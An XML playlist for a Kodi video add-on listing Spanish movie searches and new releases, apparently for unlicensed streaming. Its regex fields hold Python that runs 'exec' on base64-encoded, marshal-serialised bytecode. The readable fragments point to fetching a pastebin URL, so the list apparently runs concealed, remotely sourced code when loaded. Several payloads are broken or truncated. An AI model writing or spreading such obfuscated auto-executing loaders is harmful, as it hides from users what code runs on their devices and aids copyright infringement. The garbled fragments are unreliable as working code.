<?xml version="1.0" encoding="UTF-8" standalone="yes"?>









<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Buscador [COLOR white]Pidepalomitas[/COLOR]</title>
<link>CRISTAL</link>
<jsonrpc>plugin://plugin.video.cristalazul/?iconimage=https%3a%2f%2fi.imgur.com%2fm6YPUYA.jpg&amp;mode=17&amp;regexs=%7bu%27reparar_conectores%27%3a%20%7b%27expres%27%3a%20u%27%23%24pyFunction%5cr%5cnimport%20base64%3bexec(base64.b64decode(%22aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUJRQUFBQU1BQUFCREFBQUFjMEVBQUFCa0FRQmtBQUJzQUFCOUF3QmtBZ0JxQVFCa0F3Q0RBUUI5QkFCa0JBQnFBUUJrQXdDREFRQjlBQUI4QXdCcUFnQjhCQUI4QUFBWGd3RUFhZ01BZ3dBQVV5Z0ZBQUFBVG1uLy8vLy9jeFFBQUFCaFNGSXdZMGhOTmt4NU9XbGhXRkYxWWtoclBYUUdBQUFBWW1GelpUWTBjeUFBQUFCTU1FNTJZbTFXYW1SSE9YbGFXRTVtVVROS2NHTXpVbWhpUlVZMlpGZDNQU2dFQUFBQWRBY0FBQUIxY214c2FXSXlkQVlBQUFCa1pXTnZaR1YwQndBQUFIVnliRzl3Wlc1MEJBQUFBSEpsWVdRb0JRQUFBSFFSQUFBQVR6QlBNRTlQTUU4d01FOVBNREF3VHpCMEVRQUFBRTlQVDA4d1QwOVBNRTh3VHpCUE1FOHdkQkVBQUFCUFR6QXdNREF3TUU4d1QwOHdUekJQVDFJQkFBQUFkQkVBQUFCUE1FOVBUekF3TUU5UE1EQXdUMDlQTUNnQUFBQUFLQUFBQUFCekJnQUFBSE5qY21sd2RIUU1BQUFBUjJWMFRGTlFjbTlFWVhSaEFRQUFBSE1JQUFBQUFBRU1BUThCRHdGT0tBRUFBQUJTQ1FBQUFDZ0FBQUFBS0FBQUFBQW9BQUFBQUhNR0FBQUFjMk55YVhCMGRBZ0FBQUE4Ylc5a2RXeGxQZ0VBQUFCekFBQUFBQT09IikpKQ%3d%3d%22))%5cr%5cn%27%2c%20%27name%27%3a%20u%27reparar_conectores%27%2c%20%27page%27%3a%20u%27None%27%7d%2c%20u%27selecion_inteligente%27%3a%20%7b%27expres%27%3a%20u%22%23%24pyFunction%5cr%5cnurl%20%3d%20%27%24doregex%5blink_final%5d%27%5cr%5cn%24doregex%5bimportar%5d%5cr%5cnfrom%20resolveurl.plugins.lib%20import%20jsunpack%5cr%5cn%24doregex%5breparar_conectores%5d%5cr%5cn%5cr%5cn%22%2c%20%27name%27%3a%20u%27selecion_inteligente%27%2c%20%27page%27%3a%20u%27None%27%7d%2c%20u%27importar%27%3a%20%7b%27expres%27%3a%20u%27%23%24pyFunction%5cr%5cnimport%20base64%3bexec(base64.b64decode(%22aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNBQUFBQVlBQUFCREFBQUFjL1FBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0JrQWdCOEJ3QnFCUUNEQUFCcUJnQmtBd0NEQVFCckJnQnlnUUI4QkFCcUJ3QmtCQUJrQlFCcEFnQmtCZ0JrQndBMlpBZ0FaQWtBTm1RS0FIUUlBSU1CQW1vSkFGTmtDd0I4QndCcUJRQ0RBQUJxQmdCa0F3Q0RBUUJyQmdCeXhnQjhCQUJxQndCa0JBQmtCUUJwQWdCa0JnQmtCd0EyWkFnQVpBa0FObVFLQUhRSUFJTUJBbW9KQUZOOEJBQnFCd0JrREFCa0JRQnBBZ0JrQmdCa0J3QTJaQWdBWkFrQU5tUUtBSFFJQUlNQkFtb0pBRk5rQUFCVEtBMEFBQUJPYWYvLy8vOTBDd0FBQUdOeWFYTjBZV3hoZW5Wc2RBSUFBQUJwWkhNaEFBQUFhSFIwY0hNNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0wycFFXbUZDUjFsT2RBY0FBQUJvWldGa1pYSnpjMGdBQUFCTmIzcHBiR3hoTHpVdU1DQW9WMmx1Wkc5M2N5Qk9WQ0EyTGpNN0lGZFBWelkwT3lCeWRqbzFOUzR3S1NCSFpXTnJieTh5TURFd01ERXdNU0JHYVhKbFptOTRMelUxTGpCekNnQUFBRlZ6WlhJdFFXZGxiblJ6RkFBQUFHaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRkQWNBQUFCU1pXWmxjbVZ5ZEFZQUFBQjJaWEpwWm5sMEJRQUFBR1psYzNSaGN5RUFBQUJvZEhSd2N6b3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY3ZSalJvZG1KcGVIa29DZ0FBQUhRQ0FBQUFjbVYwQ0FBQUFISmxjWFZsYzNSemRBSUFBQUJ2YzNRRUFBQUFlR0p0WTNRSkFBQUFlR0p0WTJGa1pHOXVkQVVBQUFCQlpHUnZiblFNQUFBQVoyVjBRV1JrYjI1SmJtWnZkQU1BQUFCblpYUjBCUUFBQUVaaGJITmxkQVFBQUFCMFpYaDBLQWdBQUFCMEVRQUFBRTh3VHpCUE1EQXdUekF3TURCUE1FOHdkQkVBQUFCUE1FOVBUekF3VHpBd1R6QXdUekJQVDNRUkFBQUFUMDlQVHpCUE1EQlBUMDlQTUU4d1R6QlNCZ0FBQUZJSEFBQUFVZ2dBQUFCU0NRQUFBRklLQUFBQUtBQUFBQUFvQUFBQUFITUdBQUFBYzJOeWFYQjBkQXdBQUFCSFpYUk1VMUJ5YjBSaGRHRUJBQUFBY3d3QUFBQUFBVHdCR3dFcUFSc0JLZ0pPS0FFQUFBQlNFd0FBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp%22))%5cr%5cn%27%2c%20%27name%27%3a%20u%27importar%27%2c%20%27page%27%3a%20u%27None%27%7d%2c%20u%27link_final%27%3a%20%7b%27expres%27%3a%20u%27%23%24pyFunction%5cr%5cnservidores%3d%5c%27%5bpeli.param4%5d%5c%27%5cr%5cnreferer%3d%5c%27%5bbusca.param1%5d%5c%27%5cr%5cnimport%20re%2crequests%5cr%5cnimport%20base64%3bexec(base64.b64decode(%%3d%22))%5cr%5cn%27%2c%20%27name%27%3a%20u%27link_final%27%2c%20%27page%27%3a%20u%27None%27%7d%2c%20u%27busca%27%3a%20%7b%27listrepeat%27%3a%20u%27%5cr%5cn%3ctitle%3e%5bCOLOR%20white%5d%5bbusca.param3%5d%20%20%5bCOLOR%20gold%5d%5bbusca.param4%5d%5b%2fCOLOR%5d%3c%2ftitle%3e%5cr%5cn%3clink%3e%24doregex%5bpeli%5d%3c%2flink%3e%5cr%5cn%3cthumbnail%3e%5bbusca.param2%5d%3cthumbnail%3e%5cr%5cn%3cfanart%3ehttps%3a%2f%2fi.imgur.com%2fKFAuyll.jpg%3c%2ffanart%3e%5cr%5cn%27%2c%20%27expres%27%3a%20u%27%23%24pyFunction%5cr%5cnelegir%20%3d%20%5c%27search%5c%27%5cr%5cnimport%20re%2crequests%2cbase64%2cxbmc%2cxbmcgui%2cxbmcaddon%5cr%5cnimport%20base64%3bexec(base64.b64decode(%%3d%22))%5cr%5cn%27%2c%20%27name%27%3a%20u%27busca%27%2c%20%27page%27%3a%20u%27None%27%7d%2c%20u%27peli%27%3a%20%7b%27listrepeat%27%3a%20u%27%5cr%5cn%3ctitle%3e%5bCOLOR%20white%5d%5bpeli.param2%5d%20%20%5bCOLOR%20gold%5d%5bpeli.param5%5d%5bCOLOR%20orange%5d%20%20%5bpeli.param3%5d%5b%2fCOLOR%5d%3c%2ftitle%3e%5cr%5cn%20%3clink%3e%24doregex%5bselecion_inteligente%5d%3c%2flink%3e%5cr%5cn%3cinfo%3e%5bpeli.param6%5d%3c%2finfo%3e%5cr%5cn%3cthumbnail%3e%5bbusca.param2%5d%3cthumbnail%3e%5cr%5cn%3cfanart%3ehttps%3a%2f%2fi.imgur.com%2fKFAuyll.jpg%3c%2ffanart%3e%5cr%5cn%27%2c%20%27expres%27%3a%20u%27%23%24pyFunction%5cr%5cnurl%3d%5c%27%5bbusca.param1%5d%5c%27%5cr%5cnimport%20re%2crequests%2cbase64%2cxbmc%2cxbmcaddon%5cr%5cnimport%20base64%3bexec(base64.b64decode(%%22))%5cr%5cn%27%2c%20%27name%27%3a%20u%27peli%27%2c%20%27page%27%3a%20u%27None%27%7d%7d&amp;url=%24doregex%5bbusca%5d</jsonrpc>
<thumbnail>https://i.imgur.com/2tS3oPI.jpg</thumbnail>
<fanart>https://3.bp.blogspot.com/-BwSmYmb5nTE/WzEm9R2JmQI/AAAAAAAAHt4/9QSuAKUdZjQXuJ221alO-silPWB_1olOwCLcBGAs/s1600/fanaaa.jpg</fanart>
</item>



<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Cine [COLOR white]Super Estrenos[/COLOR]</title>  
<link>$doregex[c]</link>
<regex>
<name>c</name>
<listrepeat><![CDATA[
<title>[c.param1]</title>
<genre>[c.param2]</genre>
<year>[c.param3]</year>
<info>[c.param6]</info>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[c.param4]</thumbnail>
<fanart>[c.param5]</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,xbmc,xbmcaddon,xbmcgui,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MFlSWUFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFV1RGTmVra3pUbFJWZDA1NlJYcE5SRmsxVG5wcmVrNTZXVEpPYWxVeFRucEthVTV0UlhsWmFrMTNUbXBSTUU1RVRUTk5la0V5V1ZSUk0wNVhSWHBOUkdNMFRrZFJNRnBxWXpGT2VrMTZUVVJqZWsxNldUSk5lazB5VGxSbmVrMUVVWGxPYlVrd1dsUlpOVTE2UVRKUFZFMHdUa2RSTWs1cVkzaE9SR2Q2VGxSVk5VNXRUVEJhUkdNeFRtMU5lazlFVVRST1ZHdDZUa1JSZWsxNlVURlBSRnBvVFhwRmVrOVVTbTFOZWtVeVdXcGpkMDU2UlhwT2VrMTZUbTFWTWxwcVRUSk9SMWt6VFVSS2FVNTZWVEJPZW1ONFRsUlpNMDVxVVRWT1JGVXlXV3BTYTA0eVJUQlpWRmsxVG5wbk1VOVVZM2xPUkdzd1RYcFZkMDV0V1hsYWFsa3lUbTFGTTA1RVdURk9lazE2VDFSak1rNTZTWHBQUkZreVRsUmplazE2VlhoTmJWa3lUbXBqZVU1SFRYbGFha3B0VG5wbmVrMXFaR2hPVkZFelQwUlpNazU2V1hwTmVscHFUWHBGZWsxVVNtMU9SMWt4V1ZSVk5FNVVZM3BPZWxreVRXMVpNMDlFVFhsTmVra3hUVVJOTlU1Nlp6Sk9hbEY1VG5wSmVrOVVUVFZPVkZFeVRsUlNiVTU2YXpGTlJFMHpUWHBSZWs5VVZtaE9hbGt6VDFSWk1FNTZSWGxhYWxreFRtMUZlazVFVFRSTmJWa3lUbXBqTWs1NldUSk5hbGw1VFhwamVWcHFVbXBPYWtreVdsUlJOVTE2VlRKWmVsVjNUbFJCTVUxRVRYaE9SRmt6VFhwVk5FMTZRVEpPZW1NeVRrUmpNVTVFV214T1ZGRXdXWHBqZDA1WFJUTk9WR014VG0xTk1scHFUWGRPZW1jeVRYcE5NazVIU1ROTlZGSnRUbTFSTTA1NldteE9iVlY2VDFSYWFVMTZSVEJhYW1NeFRYcE5NRmxxV1hoT1YwVjZUMFJhYTA1SFdUTlBWRlYzVFhwbk1VMUVXbXhPYlVsNlRtcFpNVTVIUlRKTmVtUm9UbXBaTTA1cVVtMU9SRkV6VGtSWmVVNHlSVE5OZWxsNVRsUkJNVTVVVVRSTmVrMHpUVlJqZWs1SFdUSk9WRkpxVFhwWk0xbFVVbXBPYW1jeFQwUlpNVTF0U1RGT1JGcG9UbFJyTVUxVVdYbE9WRUY2VFhwTmVFNXRVVEpOYWxVelRtcHJNVTU2V1RKTmVsVXhUVVJaZVU1VVFUSmFSR00xVG1wWk1GbFVUVFZOZWsweVQwUlpNazE2U1hwTmVsRXlUbTFWTVZsVVRUUk9Na1V6VDFSak5VNXFVVEphVkUxNFRtMVJNMDFVV21oTmVtTXpUVlJhYWs1cVNUQmFSRmw1VGpKRk0wOUVVbXROZW1jeldWUk5lRTVxVlhwT1JGVjNUbTFOTWxwVVpHaE9WRUV5VDFSWk0wNTZaek5aVkdOM1RtMUZlazE2VlRGT1ZGRXlUbXBWZDA1SFVURlBSRkp0VFcxWk0wMTZTbWxPYWxWNlQxUlplRTE2WjNwTmFsa3dUa1JOTUZwcVNtbE9hbFV3VGtSU2FFNVVZek5OZW1NeFRtMVZNbGw2WXpWT1IxRXlXbFJaZVUxNlZUSk5WRnBvVGxSUk1VMUVVbXROZWtFelRYcGFhazE2V1RGUFJGcHNUbnBWTVUxNlVUSk9WRUY1V21wYWFrNXFaekJQUkdNeFRsUnJNMWxVVFROT1IxRXpUWHBOZDA1cVp6Rk9la3B0VG1wSk0wOUVXVEpPYlZFeFQxUmplazV0U1ROWlZGVTBUa1JuTWs1cVZYcE9la2t3VGxSYWEwMTZSVE5OYWxWM1RucGpNRTlFWXpGT1ZHc3hUa1JhYWs1NlRUQlplazE0VGxSQk1GcEVVVE5OZW1zeFdWUlJNMDVVWnpCYVJGRXhUWHBKTVU1NldtbE9iVTB3VDFSS2JVNVVRVEpOZWxwdFRsUlZlazFVV1hwT1YwVjZUVlJSTkU1NlZUQmFSRTAwVFhwRk1rNUVTbWxPYWtreVRYcFZNVTVxV1RKTmFsRjZUbFJOTVU5VVl6Rk5lbFY2VGtSS2JVNUhTVEpPUkZwb1RucFZNMDVVV210T1JGRXpUVVJOTUUxNll6SlBSRlUxVGxSbmVrNTZVbTFPYWxFeVRXcGplVTVIVVRGTlZGbDVUbnBKTVZsVVl6Qk9iVVV4VDBSamVVNTZUVEZOUkUwMFRYcHJNazlVVFRKT1IwVXdUa1JSTWs1VVp6Tk9WRnBvVGtkRk1VNUVZekpPUjBVelQxUlpNazE2WnpCWmFsa3hUbnByTVUxRVNtbE5la0V5VG5wak1rNTZSVEpQUkZreVRYcHJNVTFFVVRKT2JVbDZUVlJqTVU1SFVYbGFhazE2VFhwak1FOUVXbXhPZWtGNlRrUmFhazV0V1hwTlZGRXpUa2RWZVZscVdtcE9hbFV4VDBSUmVrNXFWVEpPVkdNelRucEplazU2VlROT1JGVXdUMVJWZDA1RVZUTk9WRXB0VG0xRk1GcHFZekJOYlVreFdWUlpOVTU2VlhsWmFsVXlUbnBOTWxwcVdURk9SMUY2VFZSak1FNTZhekJPUkUxNlRtMVZNMDFxVlRKT1Iwa3pUbFJhYlU0eVJUTlpWRTB6VG5wQmVrNVVZM2hPVkUwelRucE5OVTVVWjNwTmVrMHpUbnBGTWs1RVdteE9iVTB5V2tSTk1FNTZRVE5OYWswelRrUmpNRTVxVVROT2Fsa3dXV3BaZWs1cVRYcE9lbHByVG1wSk1sbDZVbXBPYlUweVdYcGFhRTE2VFRKUFJGVjNUbTFOZWsxNlVUSk9iVlV4VG5wamVFNUVWVEphYW1NMVRrUlJNbGxVWTNoT1JGVXpUbXBqTWs1NlVYbFphbU41VGtkRk1GcEVVbWhOZWxFeVQwUlpNVTVxVVROTlZGazBUbFJCTTAxNlRYbE5lbFV6VFhwU2JVNTZXWHBPZWxGNVRtcFZNRnBxV20xT2VsRjZUa1JaTTA1VVVYcE5WR04zVGtSTk1VMUVXVFJPVkVFeldWUmFhRTU2VlRKT1ZGVjRUa1JGZWsxNldtMU9ha2t4VGxSTk1VMTZXVEJPYW1ONlRqSkZNMDlFWkdoTmJWbDZUbXBqZVU1RVp6Sk5hbU16VGtkSmVrOVVVbTFPZW1zelRtcFNiVTVFUlhwTmVscHJUbTFGTUU1VVZUUk9WRWt5V2xSU2FrNVVRVEpQVkZsNVRucFZNRTlFV1ROTmJWa3pUbnBOZWs1NlkzcE9lazB5VGtSak0xbFVWVFJPZWtVeFQwUk5NVTV0VFROTlZHUm9UbnBuZWs5VVZUSk5lazB6VFdwTk5VNTZVVEJhYWxWNVRYcFpNRmxxV1ROT2JVa3lUbnBaTkU1VVJUTk9WRTAxVFhwQk1VNUVUVEZPZWxVeldWUktiVTE2UVRCTmVsSnBUWHBqTVUxNlZYZE9WRUV5VG1wWk1VNTZZekZPUkdONFRrZE5NMDU2VVRST2VsVjZUa1JSTUU1cVdUTk9lbU41VGxSck1scEVWVFJPUjFVeVRrUlZlVTF0V1RGT2VsRXdUbnBaTVU1cVdYbE9WRVY2VG5wTk1rNTZTVEpaZWtwdFRrUlJNMDVVWXpCT2JWVXpUMFJOZWs1Nll6Tk9SRkpwVGtkWk1rNVVUVFJPUkZGNlRucE5lRTVFUlRCTmVtTTBUbTFaTTA1cVZURk9lbFV6VFhwUmVFMTZUVE5OZWxwcVRtMVJNRmxxV1RGT1JHY3hUVVJWTUU1RVdUSk9WRTB4VG1wUk1scHFZekZPZWsweFRVUlNhMDU2U1hwT1ZGRjZUbTFSTUUxVVVUSk5iVWt6V1ZSVmVVNXFUVEpaVkZFeFRtcFplazVVVm1oT1ZGRXdUVlJSZWs1cVVUSk5WR016VGtSck1FNUVUVFZPYlUxNlQxUk5lazVxUlhwUFZGRjRUbTFKZWs1RVl6Uk9SMVY2VFdwVk0wNUVSVEJQUkZwdFRrUlJNVmxVVW1oT1JHTXpUbXBqTTA1dFZUSlplazB3VGtSbmVrOUVZelJPUjBreFRVUmpNRTVFVFhsYWFtTXpUbnBOTWxwcVZUQk5lbWN3VG5wWk1rNXFVVE5PYWxWNFRYcEplVnBxVlRWT1IwMTZUMVJLYVU1VVp6Qk5hbHBzVGtSSk1FMXFWVEJPUkZrelRtcFplRTU2U1RKUFZGVTBUa1JqTUUxVVRUSk5iVWt4VGxSUmVrMXRXVE5OZWxwclRsUlJNazlVVVRCT1ZFRjZUMFJhYlU0eVJYcE5lbEUxVGxSUmVWcHFUWGxPYlZWNlRsUktiVTV0V1RCWlZFcHRUbFJGTUU1cVRUTk9SRlV6VG1wUmVVNTZXVE5OUkZGNFRYcEZNazlFVFhsTmVrRjZUMFJqZVU1VVVUSk9hbGw0VGtSVmVWcHFZM2xPUkdjelRtcGFhVTU2V1RGUFJGVTBUa1JKTUUxcVNtMU5lbFV4VFZSamVVNHlSVEJOVkZrelRtcFpNVTFVU20xT2VtTjZUbFJqTlU1Nll6QlBWRTAwVG5wTk0xbFVVVEZPZWxGNVdtcFNhMDVIV1RKTmFrMHhUVzFKTWs5RVRYcE5iVWt3VFZSTk1VMXRXVEJQVkZrMVRrUmplazlFVFRST2FtZDVXbXBrYUU1cVZUQk5lbU15VGtkRk1VMVVXVEpPZW1jeVdsUk5lVTVFUlhsYWFscHJUbnBuTVU1RVRYbE9SR3N3VG1wWk1rMTZaekZOVkdNeVRucG5NazU2VVRWT2Vra3lUbFJaTUU1VWF6Qk5lbHBvVFhwVk1FMVVVbXhPYWxVeVdtcFNiRTVxVlRKWmVsRjRUa2RSZWs1VVNtbE9iVmt3V1hwa2FFNXRSVEJaZWxwcFRrZFplazU2VW14T1JGa3pUMFJhYkUxNlRURk5SRmsxVGtSbk0wNXFZekJPUjBVd1QwUlZlRTVVWjNsYWFsVXlUa2RGTWsxVVdURk9WRUV6VG5wWk1FMXRTVEpaYWtwdFRsUk5NazVFU20xT2JWa3hUMFJhYkU1RWEzcFBWRnB0VGtSUk1rNVVVbXRPVkZreVRWUk5ORTVIV1hwUFJGRXhUWHBuTTA1VVZYaE9lbFY2VG5wVmVFNUhUWGxhYWxsNlRtcFZNRTVxWXpKT2Fsa3dUVlJOTlUxNlNUQlBWRmsxVFhwak1rNTZVbXhOZW1zd1RXcGFiRTVFVVhwTmVtTTBUbXBuTTA1cVRUUk9SRWw2VFhwak1rNTZSVEJaVkZreVRsUnJlazVFVFRKT1ZGa3pUWHBWTVU1cVl6Sk9lbHBvVFcxWk1rMXFTbTFPUkdjeFQwUlJNazVIV1RKT2FsWm9UbXBWTVU1VVVUUk5iVmt5VGxSU2FFNTZWWHBPVkUweVRsUnJNazU2Vm1oTmVsa3pUMFJWZDA1NlZYcE5lbEUwVG1wVk1rMVVXVE5PUkdkNVdXcGFhazVFV1RCT2VsVjNUbFJWTUZwRVZYZE5la2t6VFZSTk5VMTZZek5PYWxWNVRXMVpNRnBFVW14TmVtY3lUMVJLYlU1dFdYcE5WRXBwVFcxSmVrNUVaR2hOZWtVeFRrUkthVTE2YXpCYVJGRXpUbXBWTWxscVdUVk5la0Y2VFhwYWEwNUVXVEJQUkUwelRtcGpNMDVxV21oT2FtTXhUbnBWTkU1cVJUSk9WRTEzVFhwWk1rMTZXVEZOZW1NeFRWUlJNRTU2VFRGUFZHUm9UWHBWTUU5RVVtdE5la1V4VDBSamQwNTZXVEZQVkZwc1RYcEpNMDFFVVRCT1ZHY3dUWHBaTWs0eVJUTlBWRmsxVG5wck1rNVVZek5PYWxGNVdtcGpORTVxU1RCT1ZGVjNUWHByTVU5VVdUTk9Na1V6VDBSUk1FNVVVVEpQVkZwclRtMVpNazE2VFRKT2VtTXpUV3BaZVU1cVdUTk5hbFUwVG0xVk1VMUVUVE5PYW1NeFRWUlJNRTF0V1RKT2VtTXdUbnBqTVU5RVRURk9SRVV5V1ZSTk1rMTZaekpPZWxGNFRYcEJNbHBxVVRSTmJWa3lUVlJSZVUxNlZYbFphbFY1VGtkTmVrMXFXVE5PVkVGNlRrUmpkMDVxU1hwT1JGbDZUWHBaTUU1RVNtMU9WRUV3V2xSUmVFMTZZekJOVkZVeFRXMVpNVTFxVW1oT2Vra3hUbXBaTWs1RWF6SlBWRlYzVG5wUk1rMTZWVEpOYlZrelRYcE5NVTE2UlROT2VsVXlUa2RaTWxwcVkzbE9SR2N5V2tSVk5FNUhXVEpQVkZFMFRtcFpNMDFFVVRGT2JWRjZUV3BhYlU1cVVUSlBSRkY0VFcxWk1scHFVbXBOYlVrd1QxUmpkMDE2WnpKYWFrcHRUbFJaTUZscVdUSk9lazB6V1ZSUk5VNUhUVE5PZWsxNVRYcFJNMDVFWXpCT1ZFRjZUMFJSZVU1Nlp6SmFSRmt6VG5wWmVrMUVVbXBOZW1Nd1RrUlZORTV0U1RKUFZGSnFUWHBqTUUxcVNtMU5lbWN3VFhwTk5VMTZVVEZQVkZKc1RrUlJNMDFxVVhwT1ZHY3pUVlJaTTA1NldYcE5SR014VFhwbk0xbFVTbTFPVkZVd1dXcGpOVTVFUlRCT2FrMHhUbnByTUZsVVVtMU9lbU13VDFSTmVrNUVZek5OUkUweVRrZFJNRnBxVlRWT1JHZDZUWHBTYlU1SFZUQmFWRlYzVFcxWmVrMTZUWHBPUjFVeVRsUlNhRTF0V1ROT1JGcHFUbnBuTTA1cVl6Vk9iVlY2VFZSVk1VNXRTVE5OYWxrMVRsUlpNMDVVVFRST1ZFRXlUbFJTYlUxNlkzcE5SRlYzVGtkVk1FMVVWWGROYlVreFRtcFNhazR5UlRKUFJGcHBUbFJaZWs5RVdUTk9lbU42VDBSak5FNVVXWHBOUkdONFRYcHJlazFFWXpCTmJWbDZUVVJTYlU1cVl6Tk5hazB6VG1wamVrNVVTbTFPYlUxNlRrUlNiVTVFWXpCT1ZHTjZUbFJWTUZsNlVYbE9SR2N6V1ZSU2FrNXFZekpaYWtwdFRsUnJNbHBVVm1oT2JWa3lXV3BOZUUxNldUTk5hazEzVG5wamVrNXFVVFJPVkVFeVdXcE5kMDVVVVRKYVZFMTRUa1JOTUZwRVRURk9WRmt6VDBSUmVrNXFXWHBOVkUxNVRrUlZNazVVWXpCTmVsVXlXWHBWTVU1RVp6Rk5SRkpwVGxSUk0wOUVVVE5PUjAweFRtcE5NazVVWnpOT2VrMHpUWHByTVU1NlpHaE9SRmt5VGxSYWFFNUhUWHBQVkUwd1RucEJNMDVVVW14TmVtZDZUbFJSZUU1cVVUQk9hbGt5VG5wRk1VMTZTbTFPUkdzd1QwUlplRTV0U1hwTlZGSnBUbnBSTUU1RVVUUk9lbEV3VGtSa2FFNUVWWHBOUkVwdFRrUlZNRTlVV1RKT1JHY3hUa1JaZUU1RVNUTlpWRnBzVFhwck1FNVVTbTFPYW1zeVdXcGpNazU2UVROUFJHTXdUbXBWZWs5RVpHaE9ha2t5V2tSUmVVNXFXWHBPVkZFeFRrUlpNRmw2VFhsT2Vtc3lXbFJhYkU1VVFUTk9WRkY0VGxSQmVrMVVVWGhPUjFVeVdWUlZNMDU2UlhsYWFtTTBUa1JGZWs1Nll6Vk9hbFV3V21wU2FrMTZXVEphVkZwc1RucFZNazlVVW1wT2VrMHdUV3BLYlUxNmEzcE5WRlY1VG1wbk0wNTZWWHBOZW10NlRrUmFhVTU2U1ROT2VsRXhUWHBOTWs5VVZUQk9SRVV3VDBSak1rNTZZekpOVkdNeVRYcFZNazVVVlhwT2JVVjZUVlJaTVU1RVNYbGFhbEV3VG0xRk1VNVVVWHBPVkdjeVQxUmpNazV0VFhwT1JGRjRUbXBOTUZwcVdURk9WR3N6VGtSak5FNXFaM2xhYWxVMVRsUkJNMDFVVVRGTmJWa3pUMVJqTkUxNlVUSlpWRTE1VGxSTk0wMTZXbXBPYWxrelRucFJlVTE2VFhwUFJHTXhUbnBqTVU1VVl6Rk9SMUV4VFZSS2JVMTZhekpQVkUweFRucG5NRTVVU20xT1JFVXlXbFJaTlUxdFdUQk5WR016VFhwak1sbHFVbWxPYWsweVRWUmpOVTU2VFhsYWFrMDFUa1JSTTAxcVl6Vk9iVkY1V1dwVmVFNXFWWGxhYW1NelRrUkpNbGxxWXpOT2VrVXhUMFJhYWs1VVFYcFBSR00xVGxSWmVrOVVaR2hPUkVVeFRucFNiVTVxWXpCT1JFMTNUa1JuZVZwcVVtaE9iVmt6VFhwUmVrMXRXVEpPZWxKc1RYcFJNMDlVV1hsT1ZHTXpUMVJqTTA1WFJYcFBSRlUxVG1wamVrMTZWVFZPYW10NVdtcE5NazVFWXpOTmVsbDVUbFJGTWs1cVkzcE9hazB3VG1wTk1FNUVTWGxhYWxwc1RucHJlazFVVFhwT2Fsa3dUbnBOTWs1WFJURk5lazB3VFhwQk1scFVaR2hPUkZsNVdXcFJOVTVVU1hwT1JHTjRUbnBaZWsxcVRYaE9SMUV3VDFSWmVFMTZVVEJaVkZKcVRsUk5NVTFFVlhoT1IwMTZUMVJWTlU1RVVYcE5lbU40VGtSSk1VMUVVbTFPUkVreVRXcFZlRTF0U1ROT1ZFcHRUWHBGZVZwcVdtdE9SR015V21wWk1VNXFXVE5aVkUwMVRsUkJlazVVVFRKTmVtTXhUMFJOTkUxNlZYcE9SRTEzVG1wbk1FNVVZekZPVkdNeVdXcFZkMDV0U1hwT2VtTTFUbnBaTTA5RVRURk9SRmt4VDBSamVFNXFTVEpPVkZsNlRsUkJNVTFFVVRST2JVMHdUbXBrYUU1dFZYcE5WRkUwVGtkRk0wNTZVVFJPUjFsNlRVUlZlazU2WXpCYWFrcHRUa2RSTUUxVVRUUk9hbXN5V1ZSak5FNXFhekZPYWtwdFRtcGpNVTVFVW0xT2FrMHpUbFJqTWs1VVl6Rk5lazAwVGxScmVWcHFUVEZPUkUwelRsUlplRTVFUlROTmFsVXlUWHBqZVZwcVVUUk9lbGt3VFZSVk0wMTZaM3BOUkdSb1RrZFpNVTFFVFhkT1JHY3lUV3BrYUU1RWF6Tk5lbFUxVGxSSk0xbFVWWGhPUjFGNlRtcFZORTV0V1RCT1JFMTZUbnBOTUUxNldURk9WRkY2VGtSS2JVNUVVVEpOYWxsNFRtcG5lazVVV1RST2JWVXlXVlJSTkU1Nll6SmFhbGw2VG1wSk1VOUVXbXhPUkdjeldWUmplVTVIVVRKT1ZFMHdUbFJKTTA1RVRUUk9hbU15V1ZSTk5FNXRTVEpaVkdSb1RYcFJNMDFFWXpST2VtY3dXV3BaZWs1dFZUSmFhazE2VG5wbk1rMXFVVFJPUjAxNlRsUlJlazF0V1hwTlJGRjVUWHBqTUUxVVZYcE9ha1Y2VDFSTmQwNVVRVEpaYWxFMVRXMUpNMWxVVW10T2FtY3hUa1JhYWs1NlFYcE9hbHBzVG1wbmVrMVVUWGx